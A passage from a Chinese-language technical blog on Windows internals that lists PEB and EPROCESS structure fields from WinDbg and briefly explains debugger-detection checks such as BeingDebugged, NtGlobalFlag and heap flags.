SubSystemData    : Ptr32 Void</span><br><span class="line">   +0x018 ProcessHeap      : Ptr32 Void</span><br><span class="line">   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line">   +0x020 AtlThunkSListPtr : Ptr32 Void</span><br><span class="line">   +0x024 IFEOKey          : Ptr32 Void</span><br><span class="line">   +0x028 CrossProcessFlags : Uint4B</span><br><span class="line">   +0x028 ProcessInJob     : Pos 0, 1 Bit</span><br><span class="line">   +0x028 ProcessInitializing : Pos 1, 1 Bit</span><br><span class="line">   +0x028 ProcessUsingVEH  : Pos 2, 1 Bit</span><br><span class="line">   +0x028 ProcessUsingVCH  : Pos 3, 1 Bit</span><br><span class="line">   +0x028 ProcessUsingFTH  : Pos 4, 1 Bit</span><br><span class="line">   +0x028 ReservedBits0    : Pos 5, 27 Bits</span><br><span class="line">   +0x02c KernelCallbackTable : Ptr32 Void</span><br><span class="line">   +0x02c UserSharedInfoPtr : Ptr32 Void</span><br><span class="line">   +0x030 SystemReserved   : [1] Uint4B</span><br><span class="line">   +0x034 AtlThunkSListPtr32 : Uint4B</span><br><span class="line">   +0x038 ApiSetMap        : Ptr32 Void</span><br><span class="line">   +0x03c TlsExpansionCounter : Uint4B</span><br><span class="line">   +0x040 TlsBitmap        : Ptr32 Void</span><br><span class="line">   +0x044 TlsBitmapBits    : [2] Uint4B</span><br><span class="line">   +0x04c ReadOnlySharedMemoryBase : Ptr32 Void</span><br><span class="line">   +0x050 HotpatchInformation : Ptr32 Void</span><br><span class="line">   +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void</span><br><span class="line">   +0x058 AnsiCodePageData : Ptr32 Void</span><br><span class="line">   +0x05c OemCodePageData  : Ptr32 Void</span><br><span class="line">   +0x060 UnicodeCaseTableData : Ptr32 Void</span><br><span class="line">   +0x064 NumberOfProcessors : Uint4B</span><br><span class="line">   +0x068 NtGlobalFlag     : Uint4B</span><br><span class="line">   +0x070 CriticalSectionTimeout : _LARGE_INTEGER</span><br><span class="line">   +0x078 HeapSegmentReserve : Uint4B</span><br><span class="line">   +0x07c HeapSegmentCommit : Uint4B</span><br><span class="line">   +0x080 HeapDeCommitTotalFreeThreshold : Uint4B</span><br><span class="line">   +0x084 HeapDeCommitFreeBlockThreshold : Uint4B</span><br><span class="line">   +0x088 NumberOfHeaps    : Uint4B</span><br><span class="line">   +0x08c MaximumNumberOfHeaps : Uint4B</span><br><span class="line">   +0x090 ProcessHeaps     : Ptr32 Ptr32 Void</span><br><span class="line">   +0x094 GdiSharedHandleTable : Ptr32 Void</span><br><span class="line">   +0x098 ProcessStarterHelper : Ptr32 Void</span><br><span class="line">   +0x09c GdiDCAttributeList : Uint4B</span><br><span class="line">   +0x0a0 LoaderLock       : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line">   +0x0a4 OSMajorVersion   : Uint4B</span><br><span class="line">   +0x0a8 OSMinorVersion   : Uint4B</span><br><span class="line">   +0x0ac OSBuildNumber    : Uint2B</span><br><span class="line">   +0x0ae OSCSDVersion     : Uint2B</span><br><span class="line">   +0x0b0 OSPlatformId     : Uint4B</span><br><span class="line">   +0x0b4 ImageSubsystem   : Uint4B</span><br><span class="line">   +0x0b8 ImageSubsystemMajorVersion : Uint4B</span><br><span class="line">   +0x0bc ImageSubsystemMinorVersion : Uint4B</span><br><span class="line">   +0x0c0 ActiveProcessAffinityMask : Uint4B</span><br><span class="line">   +0x0c4 GdiHandleBuffer  : [34] Uint4B</span><br><span class="line">   +0x14c PostProcessInitRoutine : Ptr32     void </span><br><span class="line">   +0x150 TlsExpansionBitmap : Ptr32 Void</span><br><span class="line">   +0x154 TlsExpansionBitmapBits : [32] Uint4B</span><br><span class="line">   +0x1d4 SessionId        : Uint4B</span><br><span class="line">   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER</span><br><span class="line">   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER</span><br><span class="line">   +0x1e8 pShimData        : Ptr32 Void</span><br><span class="line">   +0x1ec AppCompatInfo    : Ptr32 Void</span><br><span class="line">   +0x1f0 CSDVersion       : _UNICODE_STRING</span><br><span class="line">   +0x1f8 ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA</span><br><span class="line">   +0x1fc ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP</span><br><span class="line">   +0x200 SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA</span><br><span class="line">   +0x204 SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP</span><br><span class="line">   +0x208 MinimumStackCommit : Uint4B</span><br><span class="line">   +0x20c FlsCallback      : Ptr32 _FLS_CALLBACK_INFO</span><br><span class="line">   +0x210 FlsListHead      : _LIST_ENTRY</span><br><span class="line">   +0x218 FlsBitmap        : Ptr32 Void</span><br><span class="line">   +0x21c FlsBitmapBits    : [4] Uint4B</span><br><span class="line">   +0x22c FlsHighIndex     : Uint4B</span><br><span class="line">   +0x230 WerRegistrationData : Ptr32 Void</span><br><span class="line">   +0x234 WerShipAssertPtr : Ptr32 Void</span><br><span class="line">   +0x238 pContextData     : Ptr32 Void</span><br><span class="line">   +0x23c pImageHeaderHash : Ptr32 Void</span><br><span class="line">   +0x240 TracingFlags     : Uint4B</span><br><span class="line">   +0x240 HeapTracingEnabled : Pos 0, 1 Bit</span><br><span class="line">   +0x240 CritSecTracingEnabled : Pos 1, 1 Bit</span><br><span class="line">   +0x240 SpareTracingBits : Pos 2, 30 Bits</span><br></pre></td></tr></table></figure><h4 id="BeingDebugged"><a href="#BeingDebugged" class="headerlink" title="BeingDebugged"></a>BeingDebugged</h4><p>可以使用IsDebuggerPresent()也可以直接检查peb-&gt;BeingDebugged</p><h4 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h4><p>peb-&gt;NtGlobalFlag（x86为 <code>+0x068</code>, x64为 <code>+0x0BC</code>）</p><p>在启动时，NtGlobalFlag全局系统变量将使用系统注册表项中的值进行初始化：<code>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\GlobalFlag]</code></p><p>FLG_HEAP_ENABLE_TAIL_CHECK(0x10)<br>FLG_HEAP_ENABLE_FREE_CHECK(0x20)<br>FLG_HEAP_VALIDATE_PARAMETERS(0x40)</p><p>当进程由调试器启动时，Windows 内存管理器会默认启用一些特殊的堆（Heap）调试选项，以便帮助开发者发现内存泄漏或越界。这些选项包括“堆尾检查”、“堆释放检查”等，通常被调试时，该值为 0x70，即 <code>FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS</code>。</p><h4 id="Heap-Flags-ForceFlags"><a href="#Heap-Flags-ForceFlags" class="headerlink" title="Heap Flags &amp; ForceFlags"></a>Heap Flags &amp; ForceFlags</h4><p>通过 PEB 找到 <code>ProcessHeap</code> 指针，进而访问堆结构 。</p><ul><li>ProcessHeap-&gt;Flags：在正常进程中，堆应该包含 <code>HEAP_GROWABLE</code> (0x00000002) 标志。如果被调试，这个标志可能会丢失或被修改 。</li><li>ProcessHeap-&gt;ForceFlags：用于强制某些堆行为。正常情况下通常为 0，但如果被调试，它会包含非零值（依赖于操作系统版本，如 XP 下是特定值）。</li></ul><p>堆尾部填充 (Heap Tail)检查</p><ul><li>字段&#x2F;特征: 检查堆块分配后的尾部填充字节。</li><li>检测逻辑 : 调试堆通常会使用特定的填充模式：</li><li><code>0xABABABAB</code>: 表示启用了 <code>HEAP_TAIL_CHECKING_ENABLED</code>。</li><li><code>0xFEEEFEEE</code>: 表示启用了 <code>HEAP_FREE_CHECKING_ENABLED</code>（释放后填充）</li></ul><h4 id="CrossProcessFlags"><a href="#CrossProcessFlags" class="headerlink" title="CrossProcessFlags"></a>CrossProcessFlags</h4><p>第四位为ProcessUsingVEH，可用来检测是否使用了VEH</p><p><img src="/image/2025-12-31-leaning_windows_5/1767261238093.png" alt="1767261238093"></p><h3 id="内核中的进程信息检测"><a href="#内核中的进程信息检测" class="headerlink" title="内核中的进程信息检测"></a>内核中的进程信息检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line">2: kd&gt; dt _EPROCESS</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">  +0x000 Pcb              : _KPROCESS// 子结构体</span><br><span class="line">  +0x0b0 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">  +0x0b4 UniqueProcessId  : Ptr32 Void// 进程的编号（任务管理器中的PID）</span><br><span class="line">  +0x0b8 ActiveProcessLinks : _LIST_ENTRY// 双向链表，所有的活动进程都链接在一起，构成了一个链表</span><br><span class="line">  +0x0c0 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">  +0x0c4 VdmObjects       : Ptr32 Void</span><br><span class="line">  +0x0c8 Flags2           : Uint4B</span><br><span class="line">  +0x0c8 JobNotReallyActive : Pos 0, 1 Bit</span><br><span class="line">  +0x0c8 AccountingFolded : Pos 1, 1 Bit</span><br><span class="line">  +0x0c8 NewProcessReported : Pos 2, 1 Bit</span><br><span class="line">  +0x0c8 ExitProcessReported : Pos 3, 1 Bit</span><br><span class="line">  +0x0c8 ReportCommitChanges : Pos 4, 1 Bit</span><br><span class="line">  +0x0c8 LastReportMemory : Pos 5, 1 Bit</span><br><span class="line">  +0x0c8 ForceWakeCharge  : Pos 6, 1 Bit</span><br><span class="line">  +0x0c8 CrossSessionCreate : Pos 7, 1 Bit</span><br><span class="line">  +0x0c8 NeedsHandleRundown : Pos 8, 1 Bit</span><br><span class="line">  +0x0c8 RefTraceEnabled  : Pos 9, 1 Bit</span><br><span class="line">  +0x0c8 PicoCreated      : Pos 10, 1 Bit</span><br><span class="line">  +0x0c8 EmptyJobEvaluated : Pos 11, 1 Bit</span><br><span class="line">  +0x0c8 DefaultPagePriority : Pos 12, 3 Bits</span><br><span class="line">  +0x0c8 PrimaryTokenFrozen : Pos 15, 1 Bit</span><br><span class="line">  +0x0c8 ProcessVerifierTarget : Pos 16, 1 Bit</span><br><span class="line">  +0x0c8 RestrictSetThreadContext : Pos 17, 1 Bit</span><br><span class="line">  +0x0c8 AffinityPermanent : Pos 18, 1 Bit</span><br><span class="line">  +0x0c8 AffinityUpdateEnable : Pos 19, 1 Bit</span><br><span class="line">  +0x0c8 PropagateNode    : Pos 20, 1 Bit</span><br><span class="line">  +0x0c8 ExplicitAffinity : Pos 21, 1 Bit</span><br><span class="line">  +0x0c8 ProcessExecutionState : Pos 22, 2 Bits</span><br><span class="line">  +0x0c8 EnableReadVmLogging : Pos 24, 1 Bit</span><br><span class="line">  +0x0c8 EnableWriteVmLogging : Pos 25, 1 Bit</span><br><span class="line">  +0x0c8 FatalAccessTerminationRequested : Pos 26, 1 Bit</span><br><span class="line">  +0x0c8 DisableSystemAllowedCpuSet : Pos 27, 1 Bit</span><br><span class="line">  +0x0c8 ProcessStateChangeRequest : Pos 28, 2 Bits</span><br><span class="line">  +0x0c8 ProcessStateChangeInProgress : Pos 30, 1 Bit</span><br><span class="line">  +0x0c8 InPrivate        : Pos 31, 1 Bit</span><br><span class="line">  +0x0cc Flags            : Uint4B</span><br><span class="line">  +0x0cc CreateReported   : Pos 0, 1 Bit</span><br><span class="line">  +0x0cc NoDebugInherit   : Pos 1, 1 Bit</span><br><span class="line">  +0x0cc ProcessExiting   : Pos 2, 1 Bit</span><br><span class="line">  +0x0cc ProcessDelete    : Pos 3, 1 Bit</span><br><span class="line">  +0x0cc ManageExecutableMemoryWrites : Pos 4, 1 Bit</span><br><span class="line">  +0x0cc VmDeleted        : Pos 5, 1 Bit</span><br><span class="line">  +0x0cc OutswapEnabled   : Pos 6, 1 Bit</span><br><span class="line">  +0x0cc Outswapped       : Pos 7, 1 Bit</span><br><span class="line">  +0x0cc FailFastOnCommitFail : Pos 8, 1 Bit</span><br><span class="line">  +0x0cc Wow64VaSpace4Gb  : Pos 9, 1 Bit</span><br><span class="line">  +0x0cc AddressSpaceInitialized : Pos 10, 2 Bits</span><br><span class="line">  +0x0cc SetTimerResolution : Pos 12, 1 Bit</span><br><span class="line">  +0x0cc BreakOnTermination : Pos 13, 1 Bit</span><br><span class="line">  +0x0cc DeprioritizeViews : Pos 14, 1 Bit</span><br><span class="line">  +0x0cc WriteWatch       : Pos 15, 1 Bit</span><br><span class="line">  +0x0cc ProcessInSession : Pos 16, 1 Bit</span><br><span class="line">  +0x0cc OverrideAddressSpace : Pos 17, 1 Bit</span><br><span class="line">  +0x0cc HasAddressSpace  : Pos 18, 1 Bit</span><br><span class="line">  +0x0cc LaunchPrefetched : Pos 19, 1 Bit</span><br><span class="line">  +0x0cc Background       : Pos 20, 1 Bit</span><br><span class="line">  +0x0cc VmTopDown        : Pos 21, 1 Bit</span><br><span class="line">  +0x0cc ImageNotifyDone  : Pos 22, 1 Bit</span><br><span class="line">  +0x0cc PdeUpdateNeeded  : Pos 23, 1 Bit</span><br><span class="line">  +0x0cc VdmAllowed       : Pos 24, 1 Bit</span><br><span class="line">  +0x0cc ProcessRundown   : Pos 25, 1 Bit</span><br><span class="line">  +0x0cc ProcessInserted  : Pos 26, 1 Bit</span><br><span class="line">  +0x0cc DefaultIoPriority : Pos 27, 3 Bits</span><br><span class="line">  +0x0cc ProcessSelfDelete : Pos 30, 1 Bit</span><br><span class="line">  +0x0cc SetTimerResolutionLink : Pos 31, 1 Bit</span><br><span class="line">  +0x0d0 CreateTime       : _LARGE_INTEGER// 进程的创建时间</span><br><span class="line">  +0x0d8 ProcessQuotaUsage : [2] Uint4B// 物理页相关的统计信息</span><br><span class="line">  +0x0e0 ProcessQuotaPeak : [2] Uint4B// 物理页相关的统计信息</span><br><span class="line">  +0x0e8 PeakVirtualSize  : Uint4B// 虚拟内存的相关统计信息</span><br><span class="line">  +0x0ec VirtualSize      : Uint4B// 虚拟内存的相关统计信息</span><br><span class="line">  +0x0f0 SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">  +0x0f8 ExceptionPortData : Ptr32 Void// 调试相关</span><br><span class="line">  +0x0f8 ExceptionPortValue : Uint4B</span><br><span class="line">  +0x0f8 ExceptionPortState : Pos 0, 3 Bits</span><br><span class="line">  +0x0fc Token            : _EX_FAST_REF</span><br><span class="line">  +0x100 MmReserved       : Uint4B</span><br><span class="line">  +0x104 AddressCreationLock : _EX_PUSH_LOCK</span><br><span class="line">  +0x108 PageTableCommitmentLock : _EX_PUSH_LOCK</span><br><span class="line">  +0x10c RotateInProgress : Ptr32 _ETHREAD</span><br><span class="line">  +0x110 ForkInProgress   : Ptr32 _ETHREAD</span><br><span class="line">  +0x114 CommitChargeJob  : Ptr32 _EJOB</span><br><span class="line">  +0x118 CloneRoot        : _RTL_AVL_TREE</span><br><span class="line">  +0x11c NumberOfPrivatePages : Uint4B</span><br><span class="line">  +0x120 NumberOfLockedPages : Uint4B</span><br><span class="line">  +0x124 Win32Process     : Ptr32 Void</span><br><span class="line">  +0x128 Job              : Ptr32 _EJOB</span><br><span class="line">  +0x12c SectionObject    : Ptr32 Void</span><br><span class="line">  +0x130 SectionBaseAddress : Ptr32 Void</span><br><span class="line">  +0x134 Cookie           : Uint4B</span><br><span class="line">  +0x138 WorkingSetWatch  : Ptr32 _PAGEFAULT_HISTORY</span><br><span class="line">  +0x13c Win32WindowStation : Ptr32 Void</span><br><span class="line">  +0x140 InheritedFromUniqueProcessId : Ptr32 Void</span><br><span class="line">  +0x144 LdtInformation   : Ptr32 Void</span><br><span class="line">  +0x148 OwnerProcessId   : Uint4B</span><br><span class="line">  +0x14c Peb              : Ptr32 _PEB// 进程环境块（进程在3环的一个结构体，里面包含了一些进程的相关信息）</span><br><span class="line">  +0x150 Session          : Ptr32 _MM_SESSION_SPACE</span><br><span class="line">  +0x154 Spare1           : Ptr32 Void</span><br><span class="line">  +0x158 QuotaBlock       : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class="line">  +0x15c ObjectTable      : Ptr32 _HANDLE_TABLE// 句柄表</span><br><span class="line">  +0x160 DebugPort        : Ptr32 Void// 调试相关</span><br><span class="line">  +0x164 PaeTop           : Ptr32 Void</span><br><span class="line">  +0x168 DeviceMap        : Ptr32 Void</span><br><span class="line">  +0x16c EtwDataSource    : Ptr32 Void</span><br><span class="line">  +0x170 PageDirectoryPte : Uint8B</span><br><span class="line">  +0x178 ImageFilePointer : Ptr32 _FILE_OBJECT</span><br><span class="line">  +0x17c ImageFileName    : [15] UChar// 进程镜像文件名</span><br><span class="line">  +0x18b PriorityClass    : UChar</span><br><span class="line">  +0x18c SecurityPort     : Ptr32 Void</span><br><span class="line">  +0x190 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class="line">  +0x194 JobLinks         : _LIST_ENTRY</span><br><span class="line">  +0x19c HighestUserAddress : Ptr32 Void</span><br><span class="line">  +0x1a0 ThreadListHead   : _LIST_ENTRY</span><br><span class="line">  +0x1a8 ActiveThreads    : Uint4B// 活动线程的数量</span><br><span class="line">  +0x1ac ImagePathHash    : Uint4B</span><br><span class="line">  +0x1b0 DefaultHardErrorProcessing : Uint4B</span><br><span class="line">  +0x1b4 LastThreadExitStatus : Int4B</span><br><span class="line">  +0x1b8 PrefetchTrace    : _EX_FAST_REF</span><br><span class="line">  +0x1bc LockedPagesList  : Ptr32 Void</span><br><span class="line">  +0x1c0 ReadOperationCount : _LARGE_INTEGER</span><br><span class="line">  +0x1c8 WriteOperationCount : _LARGE_INTEGER</span><br><span class="line">  +0x1d0 OtherOperationCount : _LARGE_INTEGER</span><br><span class="line">  +0x1d8 ReadTransferCount : _LARGE_INTEGER</span><br><span class="line">  +0x1e0 WriteTransferCount : _LARGE_INTEGER</span><br><span class="line">  +0x1e8 OtherTransferCount : _LARGE_INTEGER</span><br><span class="line">  +0x1f0 CommitChargeLimit : Uint4B</span><br><span class="line">  +0x1f4 CommitCharge     : Uint4B// 虚拟内存的相关统计信息</span><br><span class="line">  +0x1f8 CommitChargePeak : Uint4B</span><br><span class="line">  +0x200 Vm               : _MMSUPPORT_FULL</span><br><span class="line">  +0x300 MmProcessLinks   : _LIST_ENTRY</span><br><span class="line">  +0x308 ModifiedPageCount : Uint4B</span><br><span class="line">  +0x30c ExitStatus       : Int4B</span><br><span class="line">  +0x310 VadRoot          : _RTL_AVL_TREE// 标识哪些0-2地址没占用了</span><br><span class="line">  +0x314 VadHint          : Ptr32 Void</span><br><span class="line">  +0x318 VadCount         : Uint4B</span><br><span class="line">  +0x31c VadPhysicalPages : Uint4B</span><br><span class="line">  +0x320 VadPhysicalPagesLimit : Uint4B</span><br><span class="line">  +0x324 AlpcContext      : _ALPC_PROCESS_CONTEXT</span><br><span class="line">  +0x334 TimerResolutionLink : _LIST_ENTRY</span><br><span class="line">  +0x33c TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD</span><br><span class="line">  +0x340 RequestedTimerResolution : Uint4B</span><br><span class="line">  +0x344 SmallestTimerResolution : Uint4B</span><br><span class="line">  +0x348 ExitTime         : _LARGE_INTEGER// 进程的退出时间</span><br><span class="line">  +0x350 ActiveThreadsHighWatermark : Uint4B</span><br><span class="line">  +0x354 LargePrivateVadCount : Uint4B</span><br><span class="line">  +0x358 ThreadListLock   : _EX_PUSH_LOCK</span><br><span class="line">  +0x35c WnfContext       : Ptr32 Void</span><br><span class="line">  +0x360 ServerSilo       : Ptr32 _EJOB</span><br><span class="line">  +0x364 SignatureLevel   : UChar</span><br><span class="line">  +0x365 SectionSignatureLevel : UChar</span><br><span class="line">  +0x366 Protection       : _PS_PROTECTION</span><br><span class="line">  +0x367 HangCount        : Pos 0, 3 Bits</span><br><span class="line">  +0x367 GhostCount       : Pos 3, 3 Bits</span><br><span class="line">  +0x367 PrefilterException : Pos 6, 1 Bit</span><br><span class="line">  +0x368 Flags3           : Uint4B</span><br><span class="line">  +0x368 Minimal          : Pos 0, 1 Bit</span><br><span class="line">  +0x368 ReplacingPageRoot : Pos 1, 1 Bit</span><br><span class="line">  +0x368 Crashed          : Pos 2, 1 Bit</span><br><span class="line">  +0x368 JobVadsAreTracked : Pos 3, 1 Bit</span><br><span class="line">  +0x368 VadTrackingDisabled : Pos 4, 1 Bit</span><br><span class="line">  +0x368 AuxiliaryProcess : Pos 5, 1 Bit</span><br><span class="line">  +0x368 SubsystemProcess : Pos 6, 1 Bit</span><br><span class="line">  +0x368 IndirectCpuSets  : Pos 7, 1 Bit</span><br><span class="line">  +0x368 RelinquishedCommit : Pos 8, 1 Bit</span><br><span class="line">  +0x368 HighGraphicsPriority : Pos 9, 1 Bit</span><br><span class="line">  +0x368 CommitFailLogged : Pos 10, 1 Bit</span><br><span class="line">  +0x368 ReserveFailLogged : Pos 11, 1 Bit</span><br><span class="line">  +0x368 SystemProcess    : Pos 12, 1 Bit</span><br><span class="line">  +0x368 HideImageBaseAddresses : Pos 13, 1 Bit</span><br><span class="line">  +0x368 AddressPolicyFrozen : Pos 14, 1 Bit</span><br><span class="line">  +0x368 ProcessFirstResume : Pos 15, 1 Bit</span><br><span class="line">  +0x368 ForegroundExternal : Pos 16, 1 Bit</span><br><span class="line">  +0x368 ForegroundSystem : Pos 17, 1 Bit</span><br><span class="line">  +0x368 HighMemoryPriority : Pos 18, 1 Bit</span><br><span class="line">  +0x368 EnableProcessSuspendResumeLogging : Pos 19, 1 Bit</span><br><span class="line">  +0x368 EnableThreadSuspendResumeLogging : Pos 20, 1 Bit</span><br><span class="line">  +0x368 SecurityDomainChanged : Pos 21, 1 Bit</span><br><span class="line">  +0x368 SecurityFreezeComplete : Pos 22, 1 Bit</span><br><span class="line">  +0x368 VmProcessorHost  : Pos 23, 1 Bit</span><br><span class="line">  +0x36c DeviceAsid       : Int4B</span><br><span class="line">  +0x370 SvmData          : Ptr32 Void</span><br><span class="line">  +0x374 SvmProcessLock   : _EX_PUSH_LOCK</span><br><span class="line">  +0x378 SvmLock          : Uint4B</span><br><span class="line">  +0x37c SvmProcessDeviceListHead : _LIST_ENTRY</span><br><span class="line">  +0x388 LastFreezeInterruptTime : Uint8B</span><br><span class="line">  +0x390 DiskCounters     : Ptr32 _PROCESS_DISK_COUNTERS</span><br><span class="line">  +0x394 PicoContext      : Ptr32 Void</span><br><span class="line">  +0x398 HighPriorityFaultsAllowed : Uint4B</span><br><span class="line">  +0x39c InstrumentationCallback : Ptr32 Void</span><br><span class="line">  +0x3a0 EnergyContext    : Ptr32 _PO_PROCESS_ENERGY_CONTEXT</span><br><span class="line">  +0x3a4 VmContext        : Ptr32 Void</span><br><span class="line">  +0x3a8 SequenceNumber   : Uint8B</span><br><span class="line">  +0x3b0 CreateInterruptTime : Uint8B</span><br><span class="line">  +0x3b8 CreateUnbiasedInterruptTime : Uint8B</span><br><span class="line">  +0x3c0 TotalUnbiasedFrozenTime : Uint8B</span><br><span class="line">  +0x3c8 LastAppStateUpdateTime : Uint8B</span><br><span class="line">  +0x3d0 LastAppStateUptime : Pos 0, 61 Bits</span><br><span class="line">  +0x3d0 LastAppState     : Pos 61, 3 Bits</span><br><span class="line">  +0x3d8 SharedCommitCharge : Uint4B</span><br><span class="line">  +0x3dc SharedCommitLock : _EX_PUSH_LOCK</span><br><span class="line">  +0x3e0 SharedCommitLinks : _LIST_ENTRY</span><br><span class="line">  +0x3e8 AllowedCpuSets   : Uint4B</span><br><span class="line">  +0x3ec DefaultCpuSets   : Uint4B</span><br><span class="line">  +0x3e8 AllowedCpuSetsIndirect : Ptr32 Uint4B</span><br><span class="line">  +0x3ec DefaultCpuSetsIndirect : Ptr32 Uint4B</span><br><span class="line">  +0x3f0 DiskIoAttribution : Ptr32 Void</span><br><span class="line">  +0x3f4 DxgProcess       : Ptr32 Void</span><br><span class="line">  +0x3f8 Win32KFilterSet  : Uint4B</span><br><span class="line">  +0x400 ProcessTimerDelay : _PS_INTERLOCKED_TIMER_DELAY_VALUES</span><br><span class="line">  +0x408 KTimerSets       : Uint4B</span><br><span class="line">  +0x40c KTimer2Sets      : Uint4B</span><br><span class="line">  +0x410 ThreadTimerSets  : Uint4B</span><br><span class="line">  +0x414 VirtualTimerListLock : Uint4B</span><br><span class="line">  +0x418 VirtualTimerListHead : _LIST_ENTRY</span><br><span class="line">  +0x420 WakeChannel      : _WNF_STATE_NAME</span><br><span class="line">  +0x420 WakeInfo         : _PS_PROCESS_WAKE_INFORMATION</span><br><span class="line">  +0x450 MitigationFlags  : Uint4B</span><br><span class="line">  +0x450 MitigationFlagsValues : &lt;anonymous-tag&gt;</span><br><span class="line">  +0x454 MitigationFlags2 : Uint4B</span><br><span class="line">  +0x454 MitigationFlags2Values : 